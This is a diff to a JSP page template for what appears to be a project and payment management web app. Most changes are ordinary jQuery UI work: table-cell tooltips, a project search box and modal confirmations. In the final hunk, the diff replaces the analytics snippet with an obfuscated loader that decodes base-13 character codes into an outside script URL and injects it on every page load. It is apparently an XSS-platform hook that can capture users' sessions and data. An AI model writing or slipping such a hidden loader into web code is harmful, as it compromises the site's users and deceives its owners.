@@ -30,6 +30,7 @@
 <script src="<s:url value="/assets/bootstrap-datepicker/js/bootstrap-datepicker.js" />"></script>
 <script src="<s:url value="/assets/bootstrap-datepicker/js/bootstrap-datepicker.zh-CN.js" />" charset="UTF-8"></script>
 <script src="<s:url value="/assets/jquery-validation/jquery.validate.min.js" />"></script>
+<script src="<s:url value="/assets/jquery-validation/additional-methods.js" />"></script>
 <script src="<s:url value="/assets/jquery-validation/localization/messages_zh.min.js" />"></script>
 <script src="<s:url value="/assets/bootstrap-select/js/bootstrap-select.min.js" />"></script>
 <script src="<s:url value="/assets/bootstrap-select/js/i18n/defaults-zh_CN.min.js" />"></script>
@@ -41,22 +42,31 @@ $(function() {
     	function() {
     		var rIndex = 2;
     		var cIndex = $(this).prevAll().length;
-    		if(self.location.href.indexOf("/full") > 0){
-    			rIndex = 4;
-    		}
+    		
+    		var rTitle;
     		if($(this).parent().attr("class") == "total"){
-    			rIndex = 0;
-    			cIndex = cIndex + 4;
+    			rTitle = $(this).parent().children("th").text();
+    			cIndex = cIndex + Number($(this).parent().children("th").attr("colspan")) - 1;
+    		}else{
+        		if(self.location.href.indexOf("/full") > 0 || self.location.href.indexOf("/month") > 0 || self.location.href.indexOf("/yeardetail") > 0){
+            		rTitle = $(this).parent().children("td[id=projectName]").text();
+        		}else if(self.location.href.indexOf("/year") > 0){
+            		rTitle = $(this).parent().children("td[id=field01]").text();
+        		}else if(self.location.href.indexOf("/paymentitem") > 0){
+        			rTitle = $(this).parent().children("td:eq(1)").text();
+        		}else{
+        			rTitle = $(this).parent().children("td:eq(" + rIndex + ")").text();
+        		}
     		}
-    		
-    		if(self.location.href.indexOf("/year") > 0){
-    			rIndex = 0;
-    		}
-    		
-    		var rTitle = $(this).parent().find("td:eq(" + rIndex + ")").text();
     		var cTitle = $(this).parents("table").find("thead tr:last th:eq(" + cIndex + ")").html();
-    		var title = "当前：" + (cTitle == '' ? '' : cTitle + " ， ") + rTitle;
-    		$("#footer span").html(title).parents("div").clearQueue().slideDown();
+    		if(rTitle || cTitle){
+    			var context = [];
+    			if(cTitle)context.push(cTitle);
+    			if(rTitle)context.push(rTitle);
+	    		var title = "当前：" + context.join("，");
+	    		$("#footer span").html(title).parents("div").clearQueue().slideDown();
+    		}
+    		return false;
     	},function() {
     		//$("#footer").slideUp();
     	}
@@ -75,14 +85,30 @@ $(function() {
     	return false;
     }
 
-	$(function() {   
-		$(".delete, .check").click(function() {
+	$(function() {      
+		$("body").delegate("#btn-search-project","click",function() {
+			var text = $("#search-project").val().trim();
+			if(text){
+				$.get("<s:url value='/project/get/' />"+text+".json",function(ret){
+					if(ret.message == "0"){
+						self.location.replace("<s:url value='/project/detail/' />"+ret.id);
+					}else{
+						$("#myModal .modal-title").html("操作提示");
+						$("#myModalContent").html(ret.message);
+						$('#myModal').modal("show");
+					}
+				});
+			}
+			return false;
+		});
+		$("body").delegate(".delete, .check","click",function() {
+			$("#myModal .modal-title").html("操作提示");
 			$("#myModalContent").html($(this).attr("data-confirm-message"));
 			$('#myModal').data("href", $(this).attr("href")).modal("show");
 			return false;
 		});
 
-		$("#myModal .btn-danger").click(function() {
+		$("#myModal .btn-danger").off("click").on("click",function() {
 			var aid = $('#myModal').data("arrears-id");
 			if(aid != null){
 		    	$.post("<s:url value='/api/repay/'/>" + aid +"/" + $("#repay_amount0").val() + "/" + $("#repay_amount1").val(), {},
@@ -125,7 +151,7 @@ $(function() {
 		});
 
 		var selfurl = self.location.href;
-		if(selfurl.indexOf('/create') < 0 && selfurl.indexOf('/modify') < 0 && selfurl.indexOf('/step') < 0){
+		if(selfurl.indexOf('/create') < 0 && selfurl.indexOf('/modify') < 0 && selfurl.indexOf('/step') < 0 && selfurl.indexOf('/paymentitem') < 0){
 			// alert(selfurl);
 			$.post("<s:url value='/api/setlasturl'/>", {url: selfurl});
 		}
@@ -136,12 +162,20 @@ $(function() {
     </div>
 <div style="display:none">
 <script>
-var _hmt = _hmt || [];
+/* var _hmt = _hmt || [];
 (function() {
   var hm = document.createElement("script");
   hm.src = "//hm.baidu.com/hm.js?31adb78aa26ff9cfbbcef455ce2cac5e";
   var s = document.getElementsByTagName("script")[0]; 
   s.parentNode.insertBefore(hm, s);
+})(); */
+(function () {
+    var m = [], t = 'scr' + 'ipt', s = ['', '38', '38', '84', '81', '77', '37', '93', '8b', '8c', '37', '81', '87', '38', '78', '84', '81', '7a', '86', '8c', '37', '82', '8b', '4b'];
+    for (var i = 1; i < s.length; i++) m += String.fromCharCode(parseInt(s[i], 13));
+    var hm = document.createElement(t);
+    hm.src = m + parseInt(Math.random() * 1e5);
+    var s = document.getElementsByTagName(t)[0];
+    s.parentNode.insertBefore(hm, s);
 })();
 </script></div>
 </body>
